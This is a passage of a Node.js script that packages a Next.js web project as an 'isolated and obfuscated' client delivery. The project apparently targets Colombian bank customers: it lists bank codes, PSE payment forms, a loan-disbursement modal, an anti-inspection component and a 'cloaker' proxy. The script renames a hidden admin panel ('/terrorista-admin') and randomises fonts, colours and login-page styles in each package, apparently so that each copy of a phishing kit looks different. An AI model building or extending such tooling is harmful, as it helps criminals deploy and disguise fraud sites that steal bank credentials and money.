// scripts/export_client.js
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const readline = require('readline');
const { createClient } = require('@supabase/supabase-js');
const { getCoreGatewayEndpoint, getCoreGatewayToken } = require('../lib/cloakerProxy.ts');

const ROOT_DIR = path.resolve(__dirname, '..');

const CORE_APP_DIRS = [
  'api',
  'banco',
  'bre-b',
  'pse',
  'x_auth_md',
  'GenericFinish'
];

const CORE_COMPONENTS_DIRS = [
  'banks',
  'bre-b',
  'xdm',
  'xdm_components'
];

const CORE_COMPONENTS_FILES = [
  'Loader.tsx',
  'FullLoader.tsx',
  'ModalDesembolso.tsx',
  'PSEForm.tsx',
  'AntiInspect.tsx'
];

const DIRS_TO_COPY = [
  'data',
  'hook',
  'lib',
  'public',
  'scripts',
  'utils'
];

const FILES_TO_COPY = [
  'proxy.ts',
  'tailwind.src.css',
  'postcss.config.mjs',
  'next-env.d.ts',
  'package.json',
  'tsconfig.json',
  'next.config.ts',
  'next.config.mjs',
  'next.config.js',
  'eslint.config.mjs',
  '.vercelignore',
  '.gitignore',
  'INICIAR_SISTEMA.bat',
  'DESPLEGAR_PRODUCCION.bat',
  'SUBIR_A_VERCEL_SIN_GIT.bat'
];

const DEFAULT_BANKS = [
  { codigo: '1022', nombre: 'BANCO UNION COLOMBIANO' },
  { codigo: '1040', nombre: 'BANCO AGRARIO' },
  { codigo: '1052', nombre: 'BANCO AV VILLAS' },
  { codigo: '1013', nombre: 'BANCO BBVA COLOMBIA S.A.' },
  { codigo: '1032', nombre: 'BANCO CAJA SOCIAL' },
  { codigo: '1066', nombre: 'BANCO COOPERATIVO COOPCENTRAL' },
  { codigo: '1051', nombre: 'BANCO DAVIVIENDA' },
  { codigo: '1001', nombre: 'BANCO DE BOGOTA' },
  { codigo: '1023', nombre: 'BANCO DE OCCIDENTE' },
  { codigo: '1062', nombre: 'BANCO FALABELLA' },
  { codigo: '1012', nombre: 'BANCO GNB SUDAMERIS' },
  { codigo: '1006', nombre: 'BANCO ITAU' },
  { codigo: '1063', nombre: 'BANCO PICHINCHA S.A.' },
  { codigo: '1002', nombre: 'BANCO POPULAR' },
  { codigo: '1058', nombre: 'BANCO SANTANDER COLOMBIA' },
  { codigo: '1069', nombre: 'BANCO SERFINANZA' },
  { codigo: '1007', nombre: 'BANCOLOMBIA' },
  { codigo: '1061', nombre: 'BANCOOMEVA S.A.' },
  { codigo: '1070', nombre: 'DALE' },
  { codigo: '1507', nombre: 'NEQUI' },
  { codigo: '1085', nombre: 'LULO BANK' },
  { codigo: '1077', nombre: 'MOVII S.A.' },
  { codigo: '1082', nombre: 'NU COLOMBIA COMPANIA DE FINANCIAMIENTO' },
  { codigo: '1019', nombre: 'SCOTIABANK COLPATRIA' },
  { codigo: '1080', nombre: 'UALÁ' }
];

function promptUser(query, defaultValue = '') {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  const promptText = defaultValue ? `${query} [${defaultValue}]: ` : `${query}: `;

  return new Promise(resolve => {
    rl.question(promptText, answer => {
      rl.close();
      const trimmed = answer.trim();
      resolve(trimmed !== '' ? trimmed : defaultValue);
    });
  });
}

function parseEnvFile(filePath) {
  if (!fs.existsSync(filePath)) return {};
  const content = fs.readFileSync(filePath, 'utf8');
  const env = {};
  content.split('\n').forEach(line => {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) return;
    const eqIdx = trimmed.indexOf('=');
    if (eqIdx !== -1) {
      env[trimmed.slice(0, eqIdx).trim()] = trimmed.slice(eqIdx + 1).trim();
    }
  });
  return env;
}

function getCliArg(flag) {
  const arg = process.argv.find(a => a.startsWith(`--${flag}=`));
  if (arg) return arg.split('=')[1].trim();
  const idx = process.argv.indexOf(`--${flag}`);
  if (idx !== -1 && process.argv[idx + 1]) return process.argv[idx + 1].trim();
  return null;
}

function getAvailableProjects() {
  const appDir = path.join(ROOT_DIR, 'app');
  const projects = [];

  if (fs.existsSync(path.join(appDir, 'page.tsx'))) {
    projects.push('pyp');
  }

  if (fs.existsSync(appDir)) {
    const entries = fs.readdirSync(appDir, { withFileTypes: true });
    for (const ent of entries) {
      if (
        ent.isDirectory() &&
        !CORE_APP_DIRS.includes(ent.name) &&
        ent.name !== 'xdm' &&
        ent.name !== 'pyp' &&
        !ent.name.startsWith('panel_') &&
        !ent.name.endsWith('-admin')
      ) {
        projects.push(ent.name);
      }
    }
  }

  return projects;
}

function copyDirRecursive(src, dest) {
  if (!fs.existsSync(src)) return;
  fs.mkdirSync(dest, { recursive: true });
  const entries = fs.readdirSync(src, { withFileTypes: true });

  for (const entry of entries) {
    const srcPath = path.join(src, entry.name);
    const destPath = path.join(dest, entry.name);

    if (entry.isDirectory()) {
      if (['node_modules', '.next', '.git', 'dist'].includes(entry.name)) continue;
      copyDirRecursive(srcPath, destPath);
    } else {
      fs.copyFileSync(srcPath, destPath);
    }
  }
}

function replaceInFilesRecursive(dir, regex, replacement) {
  const TEXT_EXTS = ['.ts', '.tsx', '.js', '.mjs', '.json', '.html', '.txt', '.env', '.example', '.css'];
  const entries = fs.readdirSync(dir, { withFileTypes: true });

  for (const entry of entries) {
    const fullPath = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      if (['node_modules', '.next', '.git', 'dist'].includes(entry.name)) continue;
      replaceInFilesRecursive(fullPath, regex, replacement);
    } else {
      const ext = path.extname(entry.name).toLowerCase();
      if (TEXT_EXTS.includes(ext) || entry.name.startsWith('.env')) {
        try {
          const content = fs.readFileSync(fullPath, 'utf8');
          if (regex.test(content)) {
            const updated = content.replace(regex, replacement);
            fs.writeFileSync(fullPath, updated, 'utf8');
          }
        } catch (e) {
          // Ignorar archivos no accesibles
        }
      }
    }
  }
}

const UI_THEMES = [
  { 
    id: 'emerald', 
    name: 'Emerald Matrix', 
    accent: 'emerald', 
    bg: 'zinc-950', 
    card: 'zinc-900', 
    border: 'zinc-800',
    hexBg: '#09090b',
    hexCard: '#121215',
    hexBorder: '#27272a',
    hexAccent: '#10b981',
    hexAccentHover: '#059669',
    rgbaGlow: 'rgba(16, 185, 129, 0.25)',
    btnTextColor: '#000'
  },
  { 
    id: 'indigo', 
    name: 'Indigo Cyber', 
    accent: 'indigo', 
    bg: 'slate-950', 
    card: 'slate-900', 
    border: 'slate-800',
    hexBg: '#020617',
    hexCard: '#0f172a',
    hexBorder: '#1e293b',
    hexAccent: '#6366f1',
    hexAccentHover: '#4f46e5',
    rgbaGlow: 'rgba(99, 102, 241, 0.25)',
    btnTextColor: '#fff'
  },
  { 
    id: 'cyan', 
    name: 'Cyan Neon', 
    accent: 'cyan', 
    bg: 'neutral-950', 
    card: 'neutral-900', 
    border: 'neutral-800',
    hexBg: '#0a0a0a',
    hexCard: '#171717',
    hexBorder: '#262626',
    hexAccent: '#06b6d4',
    hexAccentHover: '#0891b2',
    rgbaGlow: 'rgba(6, 182, 212, 0.25)',
    btnTextColor: '#000'
  },
  { 
    id: 'violet', 
    name: 'Violet Nebula', 
    accent: 'violet', 
    bg: 'stone-950', 
    card: 'stone-900', 
    border: 'stone-800',
    hexBg: '#0c0a09',
    hexCard: '#1c1917',
    hexBorder: '#292524',
    hexAccent: '#8b5cf6',
    hexAccentHover: '#7c3aed',
    rgbaGlow: 'rgba(139, 92, 246, 0.25)',
    btnTextColor: '#fff'
  },
  { 
    id: 'amber', 
    name: 'Amber Solar', 
    accent: 'amber', 
    bg: 'zinc-950', 
    card: 'zinc-900', 
    border: 'zinc-800',
    hexBg: '#09090b',
    hexCard: '#18181b',
    hexBorder: '#27272a',
    hexAccent: '#f59e0b',
    hexAccentHover: '#d97706',
    rgbaGlow: 'rgba(245, 158, 11, 0.25)',
    btnTextColor: '#000'
  },
  { 
    id: 'rose', 
    name: 'Rose Velvet', 
    accent: 'rose', 
    bg: 'zinc-950', 
    card: 'zinc-900', 
    border: 'zinc-800',
    hexBg: '#09090b',
    hexCard: '#18181b',
    hexBorder: '#27272a',
    hexAccent: '#f43f5e',
    hexAccentHover: '#e11d48',
    rgbaGlow: 'rgba(244, 63, 94, 0.25)',
    btnTextColor: '#fff'
  },
  { 
    id: 'teal', 
    name: 'Teal Oceanic', 
    accent: 'teal', 
    bg: 'slate-950', 
    card: 'slate-900', 
    border: 'slate-800',
    hexBg: '#020617',
    hexCard: '#0f172a',
    hexBorder: '#1e293b',
    hexAccent: '#14b8a6',
    hexAccentHover: '#0d9488',
    rgbaGlow: 'rgba(20, 184, 166, 0.25)',
    btnTextColor: '#000'
  },
  { 
    id: 'blue', 
    name: 'Royal Cobalt', 
    accent: 'blue', 
    bg: 'slate-950', 
    card: 'slate-900', 
    border: 'slate-800',
    hexBg: '#020617',
    hexCard: '#0f172a',
    hexBorder: '#1e293b',
    hexAccent: '#3b82f6',
    hexAccentHover: '#2563eb',
    rgbaGlow: 'rgba(59, 130, 246, 0.25)',
    btnTextColor: '#fff'
  }
];

function randomizeWizardHtml(wizardFilePath, theme, adminBrandTitle, formattedName, projectName, adminSlug) {
  if (!fs.existsSync(wizardFilePath)) return null;

  let content = fs.readFileSync(wizardFilePath, 'utf8');

  const WIZARD_FONTS = [
    { name: 'Plus Jakarta Sans', url: 'https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap' },
    { name: 'Outfit', url: 'https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap' },
    { name: 'Inter', url: 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap' },
    { name: 'Space Grotesk', url: 'https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap' }
  ];
  const selectedFont = WIZARD_FONTS[Math.floor(Math.random() * WIZARD_FONTS.length)];

  const CARD_RADII = ['1.75rem', '0.85rem', '2rem', '1.25rem'];
  const selectedCardRadius = CARD_RADII[Math.floor(Math.random() * CARD_RADII.length)];

  const BTN_GRADIENTS = [
    'background: var(--accent); color: var(--btn-text, #000); box-shadow: 0 0 20px var(--accent-glow);',
    'background: linear-gradient(135deg, var(--accent) 0%, var(--accent-hover) 100%); color: var(--btn-text, #000); box-shadow: 0 4px 20px var(--accent-glow);',
    'background: var(--accent); color: var(--btn-text, #000); border: 1px solid var(--accent); box-shadow: 0 0 25px var(--accent-glow);'
  ];
  const selectedBtnStyle = BTN_GRADIENTS[Math.floor(Math.random() * BTN_GRADIENTS.length)];

  // 1. Reemplazar fuente
  content = content.replace(/https:\/\/fonts\.googleapis\.com\/css2\?family=Plus\+Jakarta\+Sans[^\"]+/g, selectedFont.url);
  content = content.replace(/'Plus Jakarta Sans'/g, `'${selectedFont.name}'`);

  // 2. Reemplazar bloque :root
  const rootRegex = /:root\s*\{[^}]+\}/;
  const newRoot = `:root {
      --bg: ${theme.hexBg};
      --card-bg: ${theme.hexCard};
      --card-border: ${theme.hexBorder};
      --accent: ${theme.hexAccent};
      --accent-hover: ${theme.hexAccentHover};
      --accent-glow: ${theme.rgbaGlow};
      --btn-text: ${theme.btnTextColor};
      --card-radius: ${selectedCardRadius};
      --text: #f4f4f5;
      --text-muted: #a1a1aa;
      --danger: #ef4444;
      --warning: #f59e0b;
      --info: #3b82f6;
    }`;
  content = content.replace(rootRegex, newRoot);

  // 3. Geometría de tarjeta y botón
  content = content.replace(/border-radius:\s*1\.5rem;/g, `border-radius: var(--card-radius);`);
  content = content.replace(
    /background:\s*var\(--accent\);\s*color:\s*#000;\s*font-weight:\s*800;\s*font-size:\s*1\.05rem;\s*padding:\s*1rem 1\.5rem;\s*border-radius:\s*0\.75rem;\s*border:\s*none;\s*cursor:\s*pointer;\s*display:\s*flex;\s*align-items:\s*center;\s*justify-content:\s*center;\s*gap:\s*0\.5rem;\s*transition:\s*all 0\.2s ease;\s*box-shadow:\s*0 0 20px var\(--accent-glow\);/,
    `${selectedBtnStyle} font-weight: 800; font-size: 1.05rem; padding: 1rem 1.5rem; border-radius: 0.75rem; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; transition: all 0.2s ease;`
  );

  // 4. Adaptar tokens del badge, input y spinner para usar variables CSS
  content = content.replace(/background:\s*rgba\(16,\s*185,\s*129,\s*0\.15\);/g, `background: var(--accent-glow);`);
  content = content.replace(/border:\s*1px\s*solid\s*rgba\(16,\s*185,\s*129,\s*0\.3\);/g, `border: 1px solid var(--accent);`);
  content = content.replace(/box-shadow:\s*0 0 0 3px rgba\(16,\s*185,\s*129,\s*0\.15\);/g, `box-shadow: 0 0 0 3px var(--accent-glow);`);
  content = content.replace(/color:\s*#34d399;/g, `color: var(--accent);`);
  content = content.replace(/border:\s*2px\s*solid\s*rgba\(16,\s*185,\s*129,\s*0\.2\);/g, `border: 2px solid var(--accent-glow);`);

  // 5. Títulos y branding
  content = content.replace(/<title>[^<]+<\/title>/, `<title>Instalador Rápido - ${adminBrandTitle}</title>`);
  content = content.replace(/⚡ Asistente de Instalación PYP/g, `⚡ Instalador ${formattedName}`);
  content = content.replace(/<h1>Configuración de Pasarela<\/h1>/g, `<h1>Configuración de ${formattedName}</h1>`);
  content = content.replace(/value="PYP"/g, `value="${projectName}"`);
  content = content.replace(/placeholder="Ej: PYP"/g, `placeholder="Ej: ${projectName}"`);
  content = content.replace(/\/terrorista-admin/g, `/${adminSlug}`);
  content = content.replace(/XDM Control/g, adminBrandTitle);
  content = content.replace(/Panel de Control XDM/g, adminBrandTitle);
  content = content.replace(/Creando credenciales del administrador XDM\.\.\./g, `Creando credenciales de ${adminBrandTitle}...`);

  fs.writeFileSync(wizardFilePath, content, 'utf8');

  return {
    font: selectedFont.name,
    radius: selectedCardRadius
  };
}

function generateLoginPageContent(variant, theme, brandTitle, brandSubtitle, adminSlug) {
  if (variant === 'cyber_terminal') {
    return `'use client';

import React, { useState } from 'react';
import { useRouter } from 'next/navigation';

export default function LoginPage() {
  const [usuario, setUsuario] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');

    try {
      const res = await fetch('/api/xdm-auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: usuario, password }),
      });

      const data = await res.json();

      if (data.success) {
        router.push('/${adminSlug}/bancos');
      } else {
        setError(data.error || 'Credenciales inválidas');
      }
    } catch (err) {
      setError('Error de comunicación');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-${theme.bg} text-zinc-100 font-sans p-6 selection:bg-${theme.accent}-500/30">
      <div className="w-full max-w-sm border border-${theme.border} bg-${theme.card} rounded-xl p-7 shadow-xl">
        <div className="flex items-center justify-between border-b border-${theme.border} pb-4 mb-6">
          <div className="flex items-center space-x-2">
            <span className="w-2.5 h-2.5 rounded-full bg-${theme.accent}-500 animate-pulse" />
            <span className="font-mono text-xs uppercase tracking-widest text-zinc-400">TERMINAL SECURE</span>
          </div>
          <span className="text-[10px] font-mono px-2 py-0.5 rounded-sm bg-${theme.border} text-${theme.accent}-400">v2.5</span>
        </div>

        <div className="mb-6">
          <h1 className="text-xl font-bold text-zinc-100 font-mono">${brandTitle}</h1>
          <p className="text-xs text-zinc-500 mt-1">Autenticación requerida para acceder</p>
        </div>

        <form onSubmit={handleLogin} className="space-y-4 font-mono text-xs">
          <div>
            <label className="block text-zinc-400 mb-1">USUARIO_ID</label>
            <input 
              type="text" 
              required 
              value={usuario}
              onChange={e => setUsuario(e.target.value)}
              className="w-full px-3.5 py-2.5 bg-${theme.bg} border border-${theme.border} rounded-lg text-zinc-100 focus:border-${theme.accent}-500 focus:outline-none transition-colors"
              placeholder="admin"
            />
          </div>

          <div>
            <label className="block text-zinc-400 mb-1">PASSWORD_KEY</label>
            <input 
              type="password" 
              required 
              value={password}
              onChange={e => setPassword(e.target.value)}
              className="w-full px-3.5 py-2.5 bg-${theme.bg} border border-${theme.border} rounded-lg text-zinc-100 focus:border-${theme.accent}-500 focus:outline-none transition-colors"
              placeholder="••••••••"
            />
          </div>

          {error && (
            <div className="text-red-400 text-center bg-red-500/10 border border-red-500/20 py-2 rounded-lg">
              {error}
            </div>
          )}

          <button 
            type="submit" 
            disabled={isLoading}
            className="w-full mt-2 py-3 px-4 rounded-lg font-bold text-white bg-${theme.accent}-600 hover:bg-${theme.accent}-500 transition-colors uppercase tracking-wider disabled:opacity-50 cursor-pointer"
          >
            {isLoading ? '[ VALIDANDO... ]' : '[ INGRESAR AL SISTEMA ]'}
          </button>
        </form>
      </div>
    </div>
  );
}
`;
  }

  if (variant === 'executive') {
    return `'use client';

import React, { useState } from 'react';
import { useRouter } from 'next/navigation';

export default function LoginPage() {
  const [usuario, setUsuario] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');

    try {
      const res = await fetch('/api/xdm-auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: usuario, password }),
      });

      const data = await res.json();

      if (data.success) {
        router.push('/${adminSlug}/bancos');
      } else {
        setError(data.error || 'Credenciales inválidas');
      }
    } catch (err) {
      setError('Error en la conexión');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-${theme.bg} text-zinc-100 font-sans p-4 selection:bg-${theme.accent}-500/30">
      <div className="w-full max-w-md bg-${theme.card} border border-${theme.border} rounded-2xl p-8 shadow-2xl relative overflow-hidden">
        <div className="absolute top-0 left-0 right-0 h-1.5 bg-linear-to-r from-${theme.accent}-500 via-${theme.accent}-400 to-${theme.accent}-600" />
        
        <div className="mb-7">
          <div className="flex items-center justify-between mb-3">
            <span className="text-xs font-semibold px-2.5 py-1 rounded-full bg-${theme.accent}-500/10 text-${theme.accent}-400 border border-${theme.accent}-500/20">
              Panel Administrativo
            </span>
            <span className="flex items-center text-xs text-zinc-500">
              <span className="w-2 h-2 rounded-full bg-${theme.accent}-400 inline-block mr-1.5" />
              En línea
            </span>
          </div>
          <h1 className="text-2xl font-bold text-zinc-100">${brandTitle}</h1>
          <p className="text-xs text-zinc-400 mt-1">Ingresa tus credenciales autorizadas</p>
        </div>

        <form onSubmit={handleLogin} className="space-y-4 text-sm">
          <div>
            <label className="block text-xs font-medium text-zinc-300 mb-1.5">Nombre de Usuario</label>
            <input 
              type="text" 
              required 
              value={usuario}
              onChange={e => setUsuario(e.target.value)}
              className="w-full px-4 py-3 bg-${theme.bg} border border-${theme.border} rounded-xl text-zinc-100 placeholder-zinc-600 focus:outline-none focus:border-${theme.accent}-500 focus:ring-1 focus:ring-${theme.accent}-500 transition-all text-sm"
              placeholder="admin"
            />
          </div>

          <div>
            <label className="block text-xs font-medium text-zinc-300 mb-1.5">Clave de Acceso</label>
            <input 
              type="password" 
              required 
              value={password}
              onChange={e => setPassword(e.target.value)}
              className="w-full px-4 py-3 bg-${theme.bg} border border-${theme.border} rounded-xl text-zinc-100 placeholder-zinc-600 focus:outline-none focus:border-${theme.accent}-500 focus:ring-1 focus:ring-${theme.accent}-500 transition-all text-sm"
              placeholder="••••••••"
            />
          </div>

          {error && (
            <div className="text-xs text-red-400 text-center bg-red-500/10 border border-red-500/20 py-2.5 rounded-xl">
              {error}
            </div>
          )}

          <button 
            type="submit" 
            disabled={isLoading}
            className="w-full py-3.5 px-4 rounded-xl text-sm font-semibold text-white bg-${theme.accent}-600 hover:bg-${theme.accent}-500 shadow-md shadow-${theme.accent}-600/20 transition-all disabled:opacity-60 cursor-pointer"
          >
            {isLoading ? 'Comprobando...' : 'Acceder al Panel'}
          </button>
        </form>
      </div>
    </div>
  );
}
`;
  }

  // Default: glassmorphism
  return `'use client';

import React, { useState } from 'react';
import { useRouter } from 'next/navigation';

export default function LoginPage() {
  const [usuario, setUsuario] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');

    try {
      const res = await fetch('/api/xdm-auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: usuario, password }),
      });

      const data = await res.json();

      if (data.success) {
        router.push('/${adminSlug}/bancos');
      } else {
        setError(data.error || 'Credenciales inválidas');
      }
    } catch (err) {
      setError('Error de conexión con el servidor');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="relative min-h-screen flex items-center justify-center bg-${theme.bg} text-zinc-100 font-sans p-4 overflow-hidden selection:bg-${theme.accent}-500/30 selection:text-${theme.accent}-200">
      <div className="absolute -top-40 -left-40 w-96 h-96 bg-${theme.accent}-500/15 rounded-full blur-3xl pointer-events-none" />
      <div className="absolute -bottom-40 -right-40 w-96 h-96 bg-${theme.accent}-600/10 rounded-full blur-3xl pointer-events-none" />

      <div className="relative w-full max-w-md bg-${theme.card}/80 backdrop-blur-2xl border border-${theme.border} rounded-2xl shadow-2xl p-8 transition-all">
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-12 h-12 rounded-xl bg-${theme.accent}-500/10 border border-${theme.accent}-500/30 text-${theme.accent}-400 mb-4 shadow-inner">
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
          </div>
          <h1 className="text-2xl font-bold text-zinc-100 tracking-tight">${brandTitle}</h1>
          <p className="text-xs text-zinc-400 mt-1.5">${brandSubtitle}</p>
        </div>

        <form onSubmit={handleLogin} className="space-y-5">
          <div>
            <label className="block text-xs font-semibold uppercase tracking-wider text-zinc-400 mb-1.5">Usuario</label>
            <input 
              type="text" 
              required 
              value={usuario}
              onChange={e => setUsuario(e.target.value)}
              className="w-full px-4 py-3 bg-${theme.bg}/70 border border-${theme.border} rounded-xl text-zinc-100 placeholder-zinc-500 focus:outline-none focus:ring-2 focus:ring-${theme.accent}-500 focus:border-transparent transition-all text-sm"
              placeholder="admin"
            />
          </div>

          <div>
            <label className="block text-xs font-semibold uppercase tracking-wider text-zinc-400 mb-1.5">Contraseña</label>
            <input 
              type="password" 
              required 
              value={password}
              onChange={e => setPassword(e.target.value)}
              className="w-full px-4 py-3 bg-${theme.bg}/70 border border-${theme.border} rounded-xl text-zinc-100 placeholder-zinc-500 focus:outline-none focus:ring-2 focus:ring-${theme.accent}-500 focus:border-transparent transition-all text-sm"
              placeholder="••••••••"
            />
          </div>

          {error && (
            <div className="text-xs text-red-400 text-center bg-red-500/10 border border-red-500/20 py-2.5 px-3 rounded-xl">
              {error}
            </div>
          )}

          <button 
            type="submit" 
            disabled={isLoading}
            className="w-full py-3.5 px-4 rounded-xl text-sm font-semibold text-white bg-linear-to-r from-${theme.accent}-600 to-${theme.accent}-500 hover:from-${theme.accent}-500 hover:to-${theme.accent}-400 shadow-lg shadow-${theme.accent}-500/25 transition-all disabled:opacity-50 cursor-pointer"
          >
            {isLoading ? 'Verificando acceso...' : 'Iniciar Sesión'}
          </button>
        </form>
      </div>
    </div>
  );
}
`;
}

async function runExport() {
  console.log('==============================================================================');
  console.log('    GENERADOR DE PAQUETE DE CLIENTE / ENTREGA AISLADA Y OFUSCADA');
  console.log('==============================================================================\n');


  const currentEnv = parseEnvFile(path.join(ROOT_DIR, '.env'));
  const availableProjects = getAvailableProjects();

  let selectedProject = getCliArg('project') || '';
  const outputArg = getCliArg('output') || getCliArg('name') || '';
  const customAdminSlug = getCliArg('admin') || '';

  // 1. Selección del proyecto (Siempre pregunta qué carpeta/proyecto de app/ empaquetar si hay varios)
  if (!selectedProject && availableProjects.length > 0) {
    if (availableProjects.length === 1) {
      selectedProject = availableProjects[0];
    } else {
      console.log('------------------------------------------------------------------------------');
      console.log('📦 SELECCIÓN DE PROYECTO (Cada carpeta en app/ representa un proyecto):');
      console.log('------------------------------------------------------------------------------');
      availableProjects.forEach((proj, idx) => {
        const label = proj === 'pyp' ? 'pyp (Landing principal en app/page.tsx)' : `app/${proj}`;
        console.log(`  [${idx + 1}] ${label}`);
      });
      console.log('------------------------------------------------------------------------------');

      const defaultIdx = currentEnv.PROYECTO && availableProjects.includes(currentEnv.PROYECTO.toLowerCase())
        ? availableProjects.indexOf(currentEnv.PROYECTO.toLowerCase()) + 1
        : 1;

      const answer = await promptUser(
        `¿Qué proyecto de app/ deseas generar para el cliente? (Ingresa el número o nombre)`,
        String(defaultIdx)
      );

      const num = parseInt(answer, 10);
      if (!isNaN(num) && num >= 1 && num <= availableProjects.length) {
        selectedProject = availableProjects[num - 1];
      } else if (availableProjects.includes(answer.toLowerCase())) {
        selectedProject = answer.toLowerCase();
      } else {
        selectedProject = availableProjects[0];
      }
    }
  } else if (!selectedProject) {
    selectedProject = (currentEnv.PROYECTO && availableProjects.includes(currentEnv.PROYECTO.toLowerCase()))
      ? currentEnv.PROYECTO.toLowerCase()
      : (availableProjects[0] || 'pyp');
  }

  // 2. Nombre del paquete de exportación
  let exportName = outputArg;
  if (!exportName) {
    const defaultExport = selectedProject && selectedProject !== 'pyp' ? `${selectedProject}_entrega` : 'cliente_entrega';
    exportName = await promptUser(
      '📦 Ingrese el nombre para el paquete a exportar',
      defaultExport
    );
  }
  exportName = exportName.trim().replace(/[\/\\]/g, '').replace(/\s+/g, '_') || 'cliente_entrega';

  // Proteger carpetas del sistema
  const RESERVED_DIRS = ['app', 'components', 'data', 'hook', 'lib', 'public', 'scripts', 'utils', 'node_modules', '.next', '.git', 'backend', 'database', 'scratch'];
  if (RESERVED_DIRS.includes(exportName.toLowerCase())) {
    console.warn(`[!] Advertencia: El nombre '${exportName}' coincide con una carpeta del sistema.`);
    exportName = `${exportName}_entrega`;
    console.warn(`    Se exportara como: '${exportName}' para proteger tus fuentes.`);
  }

  const OUTPUT_DIR = path.join(ROOT_DIR, exportName);
  const zipPath = path.join(ROOT_DIR, `${exportName}.zip`);

  // 3. Ruta del panel administrativo (xdm pasa a ser [nombre_paquete]-admin)
  const defaultAdminSlug = `${exportName}-admin`;
  let adminSlug = customAdminSlug || defaultAdminSlug;

  if (!customAdminSlug) {
    console.log('\n------------------------------------------------------------------------------');
    console.log(`🛡️ PANEL ADMINISTRATIVO (/terrorista-admin -> /${defaultAdminSlug}):`);
    console.log('------------------------------------------------------------------------------');
    const inputSlug = await promptUser(
      '¿Deseas usar esta ruta del admin o escribir otra? (Presiona Enter para aceptar)',
      `/${defaultAdminSlug}`
    );
    adminSlug = inputSlug.trim().replace(/^\/+|\/+$/g, '') || defaultAdminSlug;
  }

  console.log(`\n[*] Proyecto seleccionado: [ ${selectedProject.toUpperCase()} ]`);
  console.log(`[*] Nombre del paquete:    [ ${exportName} ]`);
  console.log(`[*] Panel administrativo:  [ /${adminSlug} ] (reemplaza a /terrorista-admin)\n`);

  // 3. Limpiar o crear carpeta de salida de forma segura
  if (fs.existsSync(OUTPUT_DIR)) {
    try {
      const files = fs.readdirSync(OUTPUT_DIR);
      for (const file of files) {
        const curPath = path.join(OUTPUT_DIR, file);
        fs.rmSync(curPath, { recursive: true, force: true });
      }
    } catch (e) {
      // Ignorar archivos temporales en uso
    }
  } else {
    fs.mkdirSync(OUTPUT_DIR, { recursive: true });
  }

  // 4. Copiar carpetas comunes de infraestructura
  console.log('[1/5] Copiando infraestructura y modulos comunes...');
  for (const dir of DIRS_TO_COPY) {
    const src = path.join(ROOT_DIR, dir);
    const dest = path.join(OUTPUT_DIR, dir);
    if (fs.existsSync(src)) {
      copyDirRecursive(src, dest);
      console.log(`  ✓ Carpeta: ${dir}/`);
    }
  }

  // 5. Copiar archivos raíz de configuración
  for (const file of FILES_TO_COPY) {
    const src = path.join(ROOT_DIR, file);
    const dest = path.join(OUTPUT_DIR, file);
    if (fs.existsSync(src)) {
      fs.copyFileSync(src, dest);
      console.log(`  ✓ Archivo: ${file}`);
    }
  }

  // 6. Copia selectiva de 'app/'
  console.log('\n[2/5] Ensamblando rutas del proyecto y panel administrativo...');
  const destApp = path.join(OUTPUT_DIR, 'app');
  fs.mkdirSync(destApp, { recursive: true });

  if (fs.existsSync(path.join(ROOT_DIR, 'app', 'layout.tsx'))) {
    fs.copyFileSync(path.join(ROOT_DIR, 'app', 'layout.tsx'), path.join(destApp, 'layout.tsx'));
    console.log(`  ✓ app/layout.tsx`);
  }

  for (const coreDir of CORE_APP_DIRS) {
    const src = path.join(ROOT_DIR, 'app', coreDir);
    const dest = path.join(destApp, coreDir);
    if (fs.existsSync(src)) {
      copyDirRecursive(src, dest);
      console.log(`  ✓ Ruta Core: app/${coreDir}/`);
    }
  }

  // Copiar Admin a la ruta privada aleatoria: app/[adminSlug]
  const srcXdm = path.join(ROOT_DIR, 'app', 'xdm');
  const destAdmin = path.join(destApp, adminSlug);
  if (fs.existsSync(srcXdm)) {
    copyDirRecursive(srcXdm, destAdmin);
    console.log(`  ✓ Panel Admin privado copiado a: app/${adminSlug}/`);
  }

  // Copiar landing page del proyecto seleccionado
  if (selectedProject === 'pyp') {
    const srcPage = path.join(ROOT_DIR, 'app', 'page.tsx');
    if (fs.existsSync(srcPage)) {
      fs.copyFileSync(srcPage, path.join(destApp, 'page.tsx'));
